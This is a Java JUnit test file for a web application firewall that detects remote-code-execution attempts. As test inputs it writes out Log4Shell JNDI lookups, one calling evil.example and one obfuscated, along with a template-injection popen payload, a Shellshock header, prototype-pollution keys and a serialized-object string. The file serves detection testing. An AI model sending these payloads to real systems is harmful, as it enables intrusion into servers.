package com.aiwaf.core;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** The shared cases in tests/fixtures/rce_cases.json, which aiwaf-rust checks too. */
class RceCoreTest {
    private static final ObjectMapper JSON = new ObjectMapper();

    private static JsonNode fixture(String name) throws Exception {
        return JSON.readTree(Path.of("..", "tests", "fixtures", name).toFile());
    }

    @Test
    void sharedAttacksAreFound() throws Exception {
        for (JsonNode attack : fixture("rce_cases.json").get("attacks")) {
            assertEquals(attack.get(1).asText(), RceCore.classify(attack.get(0).asText()), attack.get(0).asText());
        }
    }

    @Test
    void ordinaryTextPasses() throws Exception {
        List<String> flagged = new ArrayList<>();
        for (String file : List.of("ordinary_text.json", "rce_cases.json")) {
            JsonNode values = fixture(file).get(file.equals("rce_cases.json") ? "ordinary" : "values");
            for (JsonNode value : values) {
                String rule = RceCore.classify(value.asText());
                if (rule != null) flagged.add(value.asText() + " (" + rule + ")");
            }
        }
        assertTrue(flagged.isEmpty(), flagged.toString());
        assertNull(RceCore.classify(null));
        assertEquals("rce_jndi_lookup", RceCore.classify("${jndi:ldap://x}" + "a".repeat(40_000)));
    }

    @Test
    void formFieldsAndJsonKeysAreChecked() throws Exception {
        JsonNode cases = fixture("rce_cases.json");
        AiwafConfig config = new AiwafConfig();
        for (String section : List.of("form_attacks", "json_attacks")) {
            for (JsonNode attack : cases.get(section)) {
                String body = attack.get(0).asText();
                assertEquals(attack.get(1).asText(), SqlInjectionCore.inspect(request(Map.of(), Map.of(), body), config), body);
            }
        }
        for (String section : List.of("ordinary_forms", "ordinary_json")) {
            for (JsonNode value : cases.get(section)) {
                assertNull(SqlInjectionCore.inspect(request(Map.of(), Map.of(), value.asText()), config), value.asText());
            }
        }
        for (JsonNode attack : cases.get("attacks")) {
            // The layered base64 cases among the shared attacks.
            if (attack.get(0).asText().length() > 40 && RceCore.base64Bytes(attack.get(0).asText()) != null) {
                assertEquals(attack.get(1).asText(), RceCore.classify(attack.get(0).asText()));
            }
        }
        assertNull(RceCore.inflate("plain".getBytes(), 10));
        assertNull(RceCore.classifyUpload("no code here".getBytes()));
        // A query parameter's name, as the servlet parses it.
        assertEquals("rce_prototype_pollution",
                SqlInjectionCore.inspect(request(Map.of(), Map.of("user[__proto__][isAdmin]", "1"), null), config));
        assertTrue(RceCore.pollutingKey("a.constructor.prototype"));
        assertFalse(RceCore.pollutingKey("product[prototype]"));
        assertFalse(RceCore.pollutingKey(null));
        assertEquals("rce_serialized_object", RceCore.classifyBinary(new byte[]{0x04, 0x08, 'o', ':', 0x08, 'F', 'o', 'o'}));
        assertEquals("rce_serialized_object", RceCore.classifyBinary(new byte[]{0, 1, 0, 0, 0, -1, -1, -1, -1, 1}));
        assertNull(RceCore.classifyBinary(new byte[]{0x04, 0x08, 'x'}));
        assertNull(RceCore.classifyFields("plain words"));
    }

    private static AiwafRequest request(Map<String, String> headers, Map<String, String> query, String body) {
        Map<String, String> all = new HashMap<>(Map.of("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Accept", "text/html", "Accept-Language", "en-US", "Accept-Encoding", "gzip", "Connection", "keep-alive"));
        all.putAll(headers);
        return new AiwafRequest("POST", "/search", "198.51.100.90", "US", all, query, System.currentTimeMillis(), Set.of(), body);
    }

    @Test
    void theEngineBlocksRemoteCodeExecutionAnywhereInTheRequest() {
        AiwafConfig config = new AiwafConfig();
        config.privateIpsExempted = false;
        AiwafEngine engine = new AiwafEngine(config);
        assertTrue(engine.evaluate(request(Map.of(), Map.of("q", "shoes"), "{\"name\": \"O'Reilly\"}")).allowed());
        AiwafDecision query = engine.evaluate(request(Map.of(), Map.of("q", "${jndi:ldap://evil.example/a}"), null));
        assertEquals(List.of(false, 403, "rce_jndi_lookup"), List.of(query.allowed(), query.statusCode(), query.reason()));
        assertEquals("rce_template_escape",
                engine.evaluate(request(Map.of(), Map.of(), "{\"bio\": \"{{ lipsum.__globals__['os'].popen('id') }}\"}")).reason());
        // User-Agent and Accept aren't checked for SQL, but are for these.
        assertEquals("rce_shellshock", engine.evaluate(request(Map.of("User-Agent", "() { :; }; /bin/bash -c id"), Map.of(), null)).reason());
        assertEquals("rce_jndi_lookup", engine.evaluate(request(Map.of("Accept", "${${lower:j}ndi:ldap://x}"), Map.of(), null)).reason());
        config.sqlInjectionMode = "monitor";
        assertTrue(new AiwafEngine(config).evaluate(request(Map.of(), Map.of("q", "${jndi:ldap://x}"), null)).allowed());
        assertFalse(engine.evaluate(request(Map.of(), Map.of("c", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="), null)).allowed());
    }
}
